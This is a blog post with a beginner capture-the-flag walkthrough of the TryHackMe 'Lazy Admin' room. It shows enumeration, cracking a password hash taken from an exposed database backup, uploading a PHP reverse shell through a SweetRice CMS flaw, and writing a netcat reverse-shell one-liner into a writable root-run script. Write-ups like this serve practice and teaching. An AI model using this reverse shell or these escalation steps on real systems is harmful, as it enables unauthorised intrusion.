<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="Seif-Allah's Blog" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="Seif-Allah's Blog" /> <title> TryHackMe: Lazy Admin - Seif-Allah's Blog </title> <link rel="alternate" href="http://localhost:4000/THM-Lazy-Admin/" hreflang="en-US" /> <link rel="canonical" href="http://localhost:4000/THM-Lazy-Admin/" /> <meta name="description" content="Beginner level writeUp for the &quot;Lazy Admin&quot; room." /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="TryHackMe: Lazy Admin | Seif-Allah Homrani" /> <meta property="og:title" content="TryHackMe: Lazy Admin | Seif-Allah Homrani" /> <meta property="og:type" content="website" /> <meta property="og:url" content="http://localhost:4000/THM-Lazy-Admin/" /> <meta property="og:description" content="Beginner level writeUp for the &quot;Lazy Admin&quot; room." /> <meta property="og:image" content="http://localhost:4000/assets/images/writeups/thm/lazy_admin/lazy.png" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="TryHackMe: Lazy Admin | seifallah1" /> <meta name="twitter:url" content="http://localhost:4000/THM-Lazy-Admin/" /> <meta name="twitter:site" content="@seifallah1" /> <meta name="twitter:creator" content="@seifallah1" /> <meta name="twitter:description" content="Beginner level writeUp for the &quot;Lazy Admin&quot; room." /> <meta name="twitter:image" content="http://localhost:4000/assets/images/writeups/thm/lazy_admin/lazy.png" /> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Seif-Allah's Blog" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="Jekyll Klise" /> <meta name="application-name" content="Jekyll Klise" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">home</a><a class="menu-link" href="/archive/">archive</a><a class="menu-link" href="/about/">about</a></div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <h1 class="header-title" itemprop="headline">TryHackMe: Lazy Admin</h1> <div class="post-meta"> <time datetime="2020-10-15T00:00:00+01:00" itemprop="datePublished"> Oct 15, 2020 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">Seif-Allah Homrani</span> </span> <time hidden datetime="" itemprop="dateModified"> Oct 15, 2020 </time> <span hidden itemprop="publisher" itemtype="Person">Seif-Allah Homrani</span> <span hidden itemprop="image">/assets/images/writeups/thm/lazy_admin/lazy.png</span> <span hidden itemprop="mainEntityOfPage"><p>Room Link : <a href="https://tryhackme.com/room/lazyadmin">Lazy Admin</a></p> <h3 id="introduction">Introduction</h3> <p>‘Lazy Admin’ is an easy room made by <a href="https://tryhackme.com/p/MrSeth6797">MrSeth6797</a>, great for practice challenges. Let’s get started!</p> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <p>Room Link : <a href="https://tryhackme.com/room/lazyadmin">Lazy Admin</a></p> <h3 id="introduction"> <a href="#introduction" class="anchor-head"></a> Introduction </h3> <p>‘Lazy Admin’ is an easy room made by <a href="https://tryhackme.com/p/MrSeth6797">MrSeth6797</a>, great for practice challenges. Let’s get started!</p> <h3 id="enumeration"> <a href="#enumeration" class="anchor-head"></a> Enumeration </h3> <p>Starting Nmap with the -A flag, here’s the output :</p> <hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0a0DBybd2oCUPGjhXN1BQrAhbKKJhN/PW2OCccDm6KB/+sH/2UWHy3kE1XDgWO2W3EEHVd6vf7SdrCt7sWhJSno/q1ICO6ZnHBCjyWcRMxojBvVtS4kOlzungcirIpPDxiDChZoy+ZdlC3hgnzS5ih/RstPbIy0uG7QI/K7wFzW7dqMlYw62CupjNHt/O16DlokjkzSdq9eyYwzef/CDRb5QnpkTX5iQcxyKiPzZVdX/W8pfP3VfLyd/cxBqvbtQcl3iT1n+QwL8+QArh01boMgWs6oIDxvPxvXoJ0Ts0pEQ2BFC9u7CgdvQz1p+VtuxdH6mu9YztRymXmXPKJfB
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC8TzxsGQ1Xtyg+XwisNmDmdsHKumQYqiUbxqVd+E0E0TdRaeIkSGov/GKoXY00EX2izJSImiJtn0j988XBOTFE<span class="o">=</span>
|   256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILe/TbqqjC/bQMfBM29kV2xApQbhUXLFwFJPU14Y9/Nm
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
</code></pre></div></div><hr /> <p>Examining the source code of the running web service looking for some creds, found nothing. So I fire up gobuster using the <em>directory-list-2.3-medium.txt</em> wordlist and found a subdirectory called <em>/content</em> : <img src="/assets/images/writeups/thm/lazy_admin/user_flag.png" alt="/content" /> Found out that “Basic-CMS Sweetrice” is running here, firing up gobuster again and adding <em>/content</em> to the URI and here’s the result: <img src="/assets/images/writeups/thm/lazy_admin/gobuster_content.png" alt="/gobustercontent" /> Did some research about this CMS and found that the 1.5.1 version suffers from a code execution vulnerability via the use of a cross site request forgery flaw. Check this link : <a href="https://packetstormsecurity.com/files/139521/SweetRice-1.5.1-Code-Execution.html">SweetRice-1.5.1-Code-Execution</a> So basically, this means that I can upload a php reverse shell and execute it but first we need some credentials to login and then upload our file, so we need more enumeration. I examine the other subdirectories and there’s a specific file that got my attention : <em>/content/inc/mysql_backup/mysql_backup/mysql_bakup_20191129023059-1.5.1.sql</em> ! Examining it carefully, I found a username and a password hash (<em>line 79</em>). The password hash type is MD5, I used hydra to crack it using the <em>rockyou.txt</em> wordlist and then logged in the <em>Sweetrice</em> CMS, easy hein ?</p> <h3 id="user-flag"> <a href="#user-flag" class="anchor-head"></a> User Flag </h3> <p>To get the reverse shell, I simply started my listener (<em>nc -nlvp 1234</em>) and then copied the <em>/usr/share/webshells/php/php-reverse-shell.php</em> file inside the ads section, save it and run it as mentionad in the script above. and boom! got the reverse shell !</p> <hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listening on <span class="o">[</span>any] 1234 ...
connect to <span class="o">[</span>10.2.36.150] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.217.36] 56240
Linux THM-Chal 4.15.0-70-generic <span class="c">#79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux</span>
 18:01:47 up 5 min,  0 <span class="nb">users</span>,  load average: 1.37, 2.14, 1.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ whoami
www-data
$ 
</span></code></pre></div></div><hr /> <p>This time, I was lucky by opening the <em>user.txt</em> file without any privelage escalation, and yeah it works !</p><hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cd</span> /home
<span class="nv">$ </span><span class="nb">ls
</span>itguy
<span class="nv">$ </span><span class="nb">cd </span>itguy
<span class="nv">$ </span><span class="nb">cat </span>user.txt
THM<span class="o">{</span><span class="c">#####################}</span>
</code></pre></div></div><hr /> <h3 id="root-flag"> <a href="#root-flag" class="anchor-head"></a> Root Flag </h3> <p>Now we need to find a way to get the root flag ! First of all, I ran <em>sudo -l</em> command :</p> <hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span> 
Matching Defaults entries <span class="k">for </span>www-data on THM-Chal:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User www-data may run the following commands on THM-Chal:
    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
<span class="nv">$ </span>
</code></pre></div></div><hr /> <p>Well, the user www-data can run the following command ? let’s open the backup.pl file !</p><hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat</span> /home/itguy/backup.pl
<span class="c">#!/usr/bin/perl</span>

system<span class="o">(</span><span class="s2">"sh"</span>, <span class="s2">"/etc/copy.sh"</span><span class="o">)</span><span class="p">;</span>
</code></pre></div></div><hr /> <p>hum ! can we edit the copy.sh file so it gets executed as root ?</p><hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> /etc/copy.sh
<span class="nt">-rw-r--rwx</span> 1 root root 81 Nov 29  2019 /etc/copy.sh
</code></pre></div></div><hr /> <p>and yeah we can edit it, SUPER ! So the first idea tha came in my mind is to get an another reverse shell using this command :</p><hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc \&lt;local-ip\&gt; 5554 \&gt;/tmp/f'</span> <span class="se">\&gt;</span>/etc/copy.sh
</code></pre></div></div><hr /> <p>After setting up the listener and ran the command, I got the root shell ! now it’s time the get root flag !! :) finally !</p><hr /> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# nc <span class="nt">-nlvp</span> 5554
listening on <span class="o">[</span>any] 5554 ...
connect to <span class="o">[</span>10.2.36.150] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.217.36] 51512
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
# cat /root/root.txt
</span></code></pre></div></div><hr /> <p>Congrats, now you pissed off the lazy admin !</p> </div> </article> </main> <nav class="post-nav"> <a class="post-nav-item post-nav-prev" href="/Databases-Introduction/" > <div class="nav-arrow">Previous</div> <span class="post-title">Databases - Introduction</span> </a> <a class="post-nav-item post-nav-next" href="/THM-Anonymous/"> <div class="nav-arrow">Next</div> <span class="post-title">TryHackMe: Anonymous WriteUp</span> </a> </nav> <footer class="footer"> Made by <a href="https://github.com/seifallahhomrani1" target="_blank" rel="noreferrer noopener" >Seif-Allah</a> <span class="footer_item">&copy; 2021</span> <small class="footer_copyright"> </small> </footer> <script src="/assets/js/main.js" defer="defer"></script> </div> </body> </html>
